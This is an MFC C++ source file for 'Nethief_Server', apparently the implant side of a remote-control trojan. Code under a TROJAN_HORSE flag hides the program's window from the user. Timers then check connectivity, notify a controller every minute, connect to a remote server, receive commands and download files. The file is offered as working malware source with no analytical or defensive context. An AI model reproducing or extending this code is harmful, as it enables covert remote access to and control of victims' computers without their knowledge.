// ServerDlg.cpp : implementation file
// Download by http://www.NewXing.com

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CServerDlg dialog

CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServerDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	m_pIsOnlineThread=NULL;
	m_pSendNotifyThread=NULL;
	m_pConnectServerThread=NULL;
	m_pFileSocketThread=NULL;
	m_pDownloadFileThread=NULL;

	DWORD a=(DWORD)&m_pDownloadFileThread;
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServerDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialog)
	//{{AFX_MSG_MAP(CServerDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_MESSAGE(WM_SOCKET,OnSocket)
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerDlg message handlers

BOOL CServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
#if TROJAN_HORSE
	MoveWindow(0,0,0,0,TRUE);
	//把窗口显示在看不到的位置上
	SetWindowLong(this->GetSafeHwnd(),GWL_EXSTYLE,
		WS_EX_TOOLWINDOW|WS_EX_STATICEDGE);
	//设置属性
	SetWindowText("Nethief_Server - "+((CServerApp*)AfxGetApp())->pCommunity->m_strKeyName);
	SetTimer(4,1,NULL);//Hide Main Window
#endif
	///////////////////////////////////////
	m_pFileSocket=((CServerApp*)AfxGetApp())->pFileSocket;
	m_pFileSocket->Initial();

	SetTimer(1,1000,NULL);//IsOnline
	OnTimer(1);//先尝试上线通知
	Sleep(200);
	OnTimer(3);//再尝试连接
	SetTimer(3,60000,NULL);//ConnectServer

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CServerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	if(m_pIsOnlineThread!=NULL)
		TerminateThread(m_pIsOnlineThread->m_hThread,0);
	if(m_pSendNotifyThread!=NULL)
		TerminateThread(m_pSendNotifyThread->m_hThread,0);
	if(m_pConnectServerThread!=NULL)
		TerminateThread(m_pConnectServerThread->m_hThread,0);
	if(m_pFileSocketThread!=NULL)
		TerminateThread(m_pFileSocketThread->m_hThread,0);
	if(m_pDownloadFileThread!=NULL)
		TerminateThread(m_pDownloadFileThread->m_hThread,0);
	
	CDialog::OnClose();
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CServerDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==1)
	{
		if(m_pIsOnlineThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pIsOnlineThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		m_pIsOnlineThread=AfxBeginThread(IsOnlineProc,(LPVOID)NULL);
		m_pIsOnlineThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==2)
	{
		if(m_pSendNotifyThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pSendNotifyThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		////////////////////////////////////////////////////
		m_pSendNotifyThread=AfxBeginThread(SendNotifyProc,(LPVOID)NULL);
		m_pSendNotifyThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==3)
	{
		if(m_pConnectServerThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pConnectServerThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		m_pConnectServerThread=AfxBeginThread(ConnectServerProc,(LPVOID)NULL);
		m_pConnectServerThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==4)
	{
		KillTimer(4);
		ShowWindow(SW_HIDE);
		return;
	}
	if(nIDEvent==5)
	{
		KillTimer(5);//先杀掉自己
		if(m_pDownloadFileThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pDownloadFileThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		m_pDownloadFileThread=AfxBeginThread(DownloadFileProc,(LPVOID)NULL);
		m_pDownloadFileThread->m_bAutoDelete=FALSE;
		return;
	}
}

////////////////////////////////////////////////////////////////////////
UINT IsOnlineProc(LPVOID pParam)
{
	CCommunity* pCommunity=((CServerApp*)AfxGetApp())->pCommunity;
	CWnd* pWnd=AfxGetMainWnd();
	////////////////////////////////////////////////////////////////
	if(pCommunity->IsOnline())
	{
		pWnd->KillTimer(1);//Kill IsOnline
		pWnd->SetTimer(2,60000,NULL);//SendNotify
		pWnd->SetTimer(5,1000,NULL);//Download file
	}
	return 0;
}

UINT SendNotifyProc(LPVOID pParam)
{
	CCommunity* pCommunity=((CServerApp*)AfxGetApp())->pCommunity;
	CWnd* pWnd=AfxGetMainWnd();
	////////////////////////////////////////////////////////////////
	if(!pCommunity->SendNotify(FALSE))
	{
		pWnd->KillTimer(2);//Kill SendNotify
		pWnd->SetTimer(1,1000,NULL);//IsOnline
	}
	return 0;
}

UINT ConnectServerProc(LPVOID pParam)
{
	CFileSocket* pFileSocket=((CServerApp*)AfxGetApp())->pFileSocket;
	////////////////////////////////////////////////////////////////
	pFileSocket->ConnectServer();
	return 0;
}

UINT FileSocketReadProc(LPVOID pParam)
{
	CFileSocket* pFileSocket=((CServerApp*)AfxGetApp())->pFileSocket;
	////////////////////////////////////////////////////////////////
	pFileSocket->RecvCommand();
	return 0;
}

UINT DownloadFileProc(LPVOID pParam)
{
	CCommunity* pCommunity=((CServerApp*)AfxGetApp())->pCommunity;
	////////////////////////////////////////////////////////////////
	pCommunity->DownloadFile();
	return 0;
}

//**************************************************************//
void CServerDlg::OnSocket(WPARAM wParam,LPARAM lParam)
{
	DWORD dwEvent=lParam;//产生的Socket事件
	switch(dwEvent)
	{
		case FD_READ:
		{
			if(m_pFileSocketThread!=NULL)
			{
				unsigned long ExitCode;
				GetExitCodeThread(m_pFileSocketThread->m_hThread,&ExitCode);
				if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
					return;
			}
			/////////////////////////////////////////////
			m_pFileSocketThread=AfxBeginThread(FileSocketReadProc,(LPVOID)NULL);
			m_pFileSocketThread->m_bAutoDelete=FALSE;
			break;
		}
		case FD_CLOSE:
		{
			m_pFileSocket->OnSocketClose();
			break;
		}
	}	
}

